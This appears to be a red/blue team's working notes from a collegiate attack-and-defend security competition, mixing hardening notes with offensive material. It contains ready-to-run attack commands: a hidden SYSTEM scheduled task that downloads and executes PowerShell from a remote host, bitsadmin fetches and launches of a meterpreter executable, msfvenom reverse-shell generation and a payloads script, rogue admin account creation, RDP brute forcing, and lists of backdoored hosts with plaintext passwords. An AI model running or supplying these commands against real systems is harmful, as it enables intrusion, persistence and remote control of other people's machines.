# Shadow fuchisa - the cyber darkness

## Todo:
* Make this private [✓]
* Rubber ducky to plant reverse shell (or callback)
* 
* Win
* Default password to most things:
    * Username: Administrator/root/admin
    * password: Changeme-2018
    * hackypasswords: 101Dongs!! or Lolrip!!


## ARMITAGE TEAMSERVER
Teamserver IP: 10.2.2.60 
password: animememedad
King of the Hill flag: `flag:team02`


## Passwords:
### Services
* Vcenter: 49 (new sheet)
* Scoring engine: 56
### Linux/BSD
* Vega - FreeBSD root: ~~50~~ 40 (new sheet)
    * SSH Users: 55 (new sheet)
    * Jenkins team2: 80
* Persei - 10.2.2.60 parrot root: ~~51~~ 59
* Pegasi - cloud ubuntu root: 52 (new sheet)
* Crucis - centos root: ~~53~~ 41
* Luna - root: 10(new), pi: 79(old), service accts: 89(old)
### Windows
* (win2k12) 10.2.2.30 - 1
*  windows 2k8 - 10.2.40
* Windows 2k8 -10.2.30
    - 9
### ProtonMail
* shad0wfuchs@protonmail.com : 70


## Workstation IPs:
* Kevin: 10.5.0.35
* Charlton: 10.5.0.2
* RPi: 10.4.0.102
* Matt: 10.5.0.43
* David: 10.5.0.41


## commands
net user scoringserver jAofsGGdfndsfd$@#$792hcsjaoem12 /add
net localgroup Administrators scoringserver /add

cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://10.2.2.60 c:\\a.exe&start mess.exe"

PowerShell (New-Object System.Net.WebClient).DownloadFile('','mess.exe');Start-Process ''

schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onstart /ru System


## Backups

### In-Progress
- Jenkins - Vega (Charlton)

### Finished



## Bad users (from Linux servers)
* administrator


## RPi IR
* Reptile rootkit (LKM Linux rootkit by F0rb1dd3n)
* Heaven's Door port-knocking backdoor using ICMP and UDP
* Client to access Heaven's door backdoor
* Reptile r00t module, gives root permission using hooked setreuid function
* Doesn't look to have been installed
* 


## ISTS Infrastructure (Important )
```
Callback Box
    - Ip: 
    - Port: 
    - Windows Port: 31337
    - Linux Port: -----
```

## Backdoored Boxen~
- 10.2.11.10 (blocked?)
- 10.2.1.60 (no)
- 10.2.3.60 (no)
- 10.3.10.10 (owned - team10 pegasi root : 11 ) (lockout)
- 10.3.1.10 (no)
- 10.3.11.10 (yes - team11 pegasi root : 12) (no route)
- 10.3.3.10 (yes - team3 pegasi root : 13) (no connect)
- 10.3.4.10 (yes - team4 pegasi root : 15) (no route)
- 10.3.6.10 (no)
- 10.3.8.10 (owned team8 pegasi - root : 14) **try again**
- 10.3.9.10 (0wned team9 persei - root : 10)
- 10.2.3.10 (owned, BSD team3 vega - root : 10) (working!)

## Exploited Boxes  (Windows)
10.2.x.40
10.2.x.20


## Juniper Cheatsheet
Change root pass
```set root-authentication plain-text-password```

Add backup user
```
set user shadow_fuchsia class super-user
set user shadow_fuchsia full-name "lmao"
set user shadow_fuchsia plain-text-password
```

Viewing logged in users
```show system users```

Log people out 
```request system logout user```

Lock config to your session 
``` configure exclusive```

Security policy
```show security policies```
```set security policies global policy <name> match source-address any application any then permit```
```insert security policies global policy <name> before policy <name2>```

Management
```delete system services web-management http```
```delete system services web-management https```
```
edit system services ssh
set root-login deny
```

Monitoring
```show log```
```
show security policies policy name <name>

show security idp status

show security idp counters

show security idp memory
```
```
show security flow session

show security nat source rule <rule-name>

show security nat source pool <pool-name>

show security nat source summary
```
```
set security policies global policy <name> then log session-init  

```


## locking files on windows
keep this handle open in a process:
```
CreateFile('C:\\ownership.txt', GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);
```

commandline

```
attrib +R +H +S "C:\ownership.txt"
icacls.exe "C:\ownership.txt" /reset /T
icacls.exe "C:\ownership.txt" /setowner "Nobody"
```

### Linux x86 reverse tcp
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=5555 -f elf > linux_5555.elf
``` 
### Linux x86_64 reverse tcp
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=6666 -f elf > linux_6666.elf
```
### Windows reverse tcp
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=31337 -f exe > windows_31337.exe
``` 
### Windows cmd to meterp
```
msfvenom -p windows/meterpreter/reverse_tcp -f psh-cmd LHOST=1.1.1.1 LPORT=31337 > windows_cmd.txt
```



## Encrypt Files w/ OpenSSL

```
openssl aes-256-cbc -a -salt -in test.txt -out test.txt.shadowf.enc
``` 

## Payloads.sh 
```
#!/bin/bash
if \[\[ $# -eq 0 \]\] ; then
    echo './payloads.sh our\_fucking\_ip_idiot'
    echo './payloads.sh our\_fucking\_ip_idiot'
    echo './payloads.sh our\_fucking\_ip_idiot'
    echo './payloads.sh our\_fucking\_ip_idiot'
    echo './payloads.sh our\_fucking\_ip_idiot'
    echo './payloads.sh our\_fucking\_ip_idiot'
    echo './payloads.sh our\_fucking\_ip_idiot'
    echo './payloads.sh our\_fucking\_ip_idiot'
    echo './payloads.sh our\_fucking\_ip_idiot'
    echo './payloads.sh our\_fucking\_ip_idiot'
    echo './payloads.sh our\_fucking\_ip_idiot'
                ifconfig
    exit 0
fi

echo $1
echo "\[+\] generating x86linux: linux_5555.elf"
msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=$1 LPORT=5555 -f elf > linux\_5555.elf
echo "\[+\] generating x64linux: linux_6666.elf"
msfvenom -p linux/x64/meterpreter/reverse\_tcp LHOST=$1 LPORT=6666 -f elf > linux\_6666.elf
echo "\[+\] generating x86windo: windows_31337.exe"
msfvenom -p windows/meterpreter/reverse\_tcp LHOST=$1 LPORT=31337 -f exe > windows\_31337.exe
echo "\[+\] generating x86windo - cmd prompt oneliner: windows_cmd.txt"
msfvenom -p windows/meterpreter/reverse\_tcp -f psh-cmd LHOST=$1 LPORT=31337 > windows\_cmd.txt
```


## CrowBar

```
# apt-get -y install openvpn freerdp-x11 vncviewer

```

```
git clone https://github.com/galkan/crowbar
```

```
./crowbar.py -b rdp -s 10.10.2.0/24 -u administrator -c changeme-2018!
```
## CTF
Username : ShadowFuchsia
Password : 69

We have a couple of challenges which we can solve for extra points

These are pwn challs, I guess we just ask a white teamer to verify these

De@L_w!tH_the_D3vi1
25
Trade with redteam to obtain access to another teams system.

I Can See Clearly Now That The Rain Is Gone
25
Extract a plaintext password dump from another team’s system.

A new face for Jessie
25
Deface another team’s website.

Tunnel Snakes Rule
25
Redirect another team’s ssh service to another team’s system.

Behaving Badly
25
Upload a malicious group policy object to another system.

Bring it Home
25
Configure a site to site VPN to another team without their permission.

I Like To Move It, Move it
25
Access another team’s infrastructure from their own chair

Spiders… EVERYWHERE
25
Deploy a new web application on another team’s infrastructure

Whaling Around
25
Deploy several docker containers on another team’s infrastructure.

The Hunt for a Nigerians Prince’s Brother
25
Spam a team’s email server with emails related to a Martian prince. This must be scripted and continuous.

For Your Eyes Only
50
Make and deploy a backdoor that will persist reboot on another team’s system.

Not As Good As The Super Bowl
50
Use VLC or some other video stream to watch another team use their system.

There’s an app for that!
50
Install an app on another team’s phone without their permission.

Sonata For Piano
100
Deploy a keylogger on another teams system and extract a keystroke dump.

Botman and Botboy
100
Create and deploy a botnet across at least 2 different teams systems

Stealing is bad… Unless its from the Government
100
Use another teams infrastructure to create ships for yourself

Ghost Caller
100
Make another team’s phone ring without calling it.

Splook: A Blockchain Centralized Log Solution
100
Centralize another team’s logs on one of your servers.

Rouge Slave
200
Introduce vulnerabilities into another team’s code using the Jenkins build process.

Propane and Propane Accessories
200
Take control of a King of the Hill system.

Hole Punch
300
Write a tool to bypass either IPTables or the Windows Firewall. (Example: A raw socket connector)

Hide and Seek
300
Write a tool or find a method to hide a running processes on either Windows or Linux. You may create a new process and hide it as well.


```

Hello Fleet, 

My team and I were assigned by Command Central to introduce your fleet to your newly installed osquery server!  Osquery is at the pinnacle of operating system instrumentation frameworks.  This framework works on Windows, OS X (macOS), Linux, and FreeBSD. The tools make low-level operating system analytics and monitoring both perfectly performant and insanely intuitive! 

Osquery exposes an operating system as a high-performance relational database. This allows you to write SQL queries to explore operating system data. With osquery, SQL tables represent abstract concepts such as running processes, loaded kernel modules, open network connections, browser plugins, hardware events or file hashes.  First we are going to set up the infrastructure.  To do this follow these steps: 

1.  Install Filebeat. 
2.  Configure Filebeat to read logs for /var/log/kolide.  You can do this by writing a very simple config file! 
3.  Ship logs to Greylog. 

(If you run into any problems find a white team member and request to see Ben Bornholm.) 

Well osquery doesn’t do anyone any good unless you get notifications! I think your fleet should get acquainted by setting up alerts with either e-mail or slack for a specific alert scenario.  Please return a report with the alert type, notification service (email/slack), and a screenshot of a successful alert.  This report is quite important as your employer is likely to ‘dispose’ of us if we do not deliver ‘positive’ results this time. :) 

Best regards, 

Allie 

Booze Allie Hampton 

Central Command Contractor

``` 

# Injects to do
Hello fleet,

  

Things are looking a lot better here at the office!  However things are not looking too good for you or the rest of the fleets.  Conduct a simple but comprehensive security audit of a discovered Windows Machine.  Minimally the things that should be evaluated include firewall rules, service versions and whether they are vulnerable or not, and password policies.

  

With hugs,

Quartermaster Lancy

> OSQuery 1
> 
> Hello Fleet,
> 
>   
> 
> My team and I were assigned by Command Central to introduce your fleet to your newly installed osquery server!  Osquery is at the pinnacle of operating system instrumentation frameworks.  This framework works on Windows, OS X (macOS), Linux, and FreeBSD. The tools make low-level operating system analytics and monitoring both perfectly performant and insanely intuitive!
> 
>   
> Osquery exposes an operating system as a high-performance relational database. This allows you to write SQL queries to explore operating system data. With osquery, SQL tables represent abstract concepts such as running processes, loaded kernel modules, open network connections, browser plugins, hardware events or file hashes.  First we are going to set up the infrastructure.  To do this follow these steps:
> 
>   
> 
> 1.  Install Filebeat.
>     
> 2.  Configure Filebeat to read logs for /var/log/kolide.  You can do this by writing a very simple config file!
>     
> 3.  Ship logs to Greylog.
>     
> 
>   
> 
> (If you run into any problems find a white team member and request to see Ben Bornholm.)
> 
>   
> 
> Well osquery doesn’t do anyone any good unless you get notifications! I think your fleet should get acquainted by setting up alerts with either e-mail or slack for a specific alert scenario.  Please return a report with the alert type, notification service (email/slack), and a screenshot of a successful alert.  This report is quite important as your employer is likely to ‘dispose’ of us if we do not deliver ‘positive’ results this time. :)
> 

Defense 2   
On behalf of Rear Admiral Rogers we order your fleet to learn about either Snort or Bro.  Choose one, install it, and configure it to your liking.  Return a report with your configuration and the strategies behind the config.

IR 2
Central Command has received reports that Advanced Persistent Threats have compromised several fleet infrastructures. It is vital that fleets begin the incident response process on their infrastructure to repel these attacks and discover who is performing them. Those fleets who return useful information will be rewarded by Central Command for aiding in the crusade against our adversaries. Your cooperation is greatly appreciated. Task ● Use your IR skills to discover what you believe is a potentially malicious Windows process and report on it. ● If available, follow network traffic and report on as much identifiable information about the adversary that you can.

Source 4

Central Commands mournfully reports that Colonel Sander’s ship was recently struck down by a ravenous Zero-Mach Star-Fox.  His ship was torn apart like an innocent rabbit being thrashed by a… fox.  With this news Central Command has chosen to not replace the Colonel but instead simply redirect the responsibilities to a fleet.  Management would also like to make clear that you will not be receiving a promotion nor will you be receiving a raise.  Before the fox incident, the Colonel was on route to deliver a briefing regarding your recent discoveries to STARSA   executives.  Please prepare an executive summary of the vulnerability that you discovered and your choice of mitigation for that vulnerability.  Note that these executives are powerful capitalists that do not understand the technology which their fortunes rest upon so you must utilise language that they will understand.

# Submit injects
https://pastebin.com/92yQipe9

# CTF
https://ctf.sparsa.org



## hold4later


net user sf MKHGFSnsdf!! /add
net localgroup Administrators sf /add
net user Administrator Lolrip!!
net user safety Lolrip!!
net user Administrator /active:no
net user safety /active:no
net user redteam /active:no
bitsadmin /transfer job1 /download /priority high http://67.205.157.179/windows_31337.exe %temp%\windows_31337.exe
bitsadmin /transfer job2 /download /priority normal http://67.205.157.179/fuchsia_bg.bmp %temp%\1.bmp

start %temp%\windows_31337.exe

reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  %temp%\1.bmp /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

query session > %temp%\session.txt
for /f "skip=1 tokens=3," %%i in (session.txt) DO logoff %%i
del session.txt

net stop hmailserver
net stop dns
net stop server

netsh advfirewall firewall add rule name="Allowed 2" Dir=In Action=allow RemoteIP=10.2.2.0/24
netsh advfirewall firewall add rule name="Not Allowed 1 " Dir=In Action=Block RemoteIP=10.2.1.0/24
netsh advfirewall firewall add rule name="Not Allowed 3" Dir=In Action=Block RemoteIP=10.2.3.0/24
netsh advfirewall firewall add rule name="Not Allowed 4" Dir=In Action=Block RemoteIP=10.2.4.0/24
netsh advfirewall firewall add rule name="Not Allowed 5" Dir=In Action=Block RemoteIP=10.2.5.0/24
netsh advfirewall firewall add rule name="Not Allowed 6" Dir=In Action=Block RemoteIP=10.2.6.0/24
netsh advfirewall firewall add rule name="Not Allowed 7" Dir=In Action=Block RemoteIP=10.2.7.0/24
netsh advfirewall firewall add rule name="Not Allowed 8" Dir=In Action=Block RemoteIP=10.2.8.0/24
netsh advfirewall firewall add rule name="Not Allowed 9" Dir=In Action=Block RemoteIP=10.2.9.0/24
netsh advfirewall firewall add rule name="Not Allowed 10" Dir=In Action=Block RemoteIP=10.2.10.0/24
netsh advfirewall firewall add rule name="Not Allowed 11" Dir=In Action=Block RemoteIP=10.2.11.0/24
netsh advfirewall firewall add rule name="Not Allowed 000" Dir=In Action=Block RemoteIP=0.0.0.0/0
netsh advfirewall firewall add rule name="ICMP Deny incoming V4 echo request" protocol=icmpv4:8,any dir=in action=block


takeown /F C:\Windows\System32\oobe\ /A /R
icacls C:\Windows\System32\oobe\*.bmp /grant "Everyone":F
copy %temp%\1.bmp C:\Windows\System32\oobe\background.bmp

del C:\Windows\System32\oobe\background.bmp
del C:\Windows\System32\oobe\background.jpg
del C:\Windows\System32\oobe\background.jpg

del %temp%\31337.exe
del %temp%\vmware.bat

## iptables rules for pegasi (10.3.2.10)

iptables -A INPUT -s 10.120.0.0/24 -j DROP
iptables -A INPUT -s 10.0.20.0/24 -j DROP
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -p icmp -j ACCEPT
iptables -A INPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT
iptables -P INPUT DROP
